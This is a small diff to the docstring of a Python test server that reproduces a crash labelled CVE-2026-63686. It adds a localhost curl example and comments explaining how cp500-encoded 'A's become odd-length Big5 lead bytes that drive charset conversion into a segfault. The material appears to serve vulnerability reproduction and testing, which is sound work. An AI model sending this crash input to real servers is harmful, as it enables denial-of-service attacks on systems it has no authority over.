@@ -29,9 +29,10 @@ Query parameters on GET /:
   raw_hex=<hex>       Send these raw hex bytes as the body, bypassing any
                       text encoding. Useful for precise byte-level control.
 
-Examples once the stack is up:
+Examples once the stack is up (CVE-2026-63686 trigger):
   curl "http://localhost:8080/proxy/?charset=big5&encode_as=cp500&body=AAAAAAA"
-  curl "http://localhost:8080/proxy/?charset=big5&raw_hex=c1c1c1c1c1c1c1"
+    -> 7 A's in cp500 = 7 x 0xC1 (Big5 lead bytes); odd count = incomplete sequence
+    -> APR_INCOMPLETE (70008) -> default: case -> SIGSEGV
 """
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
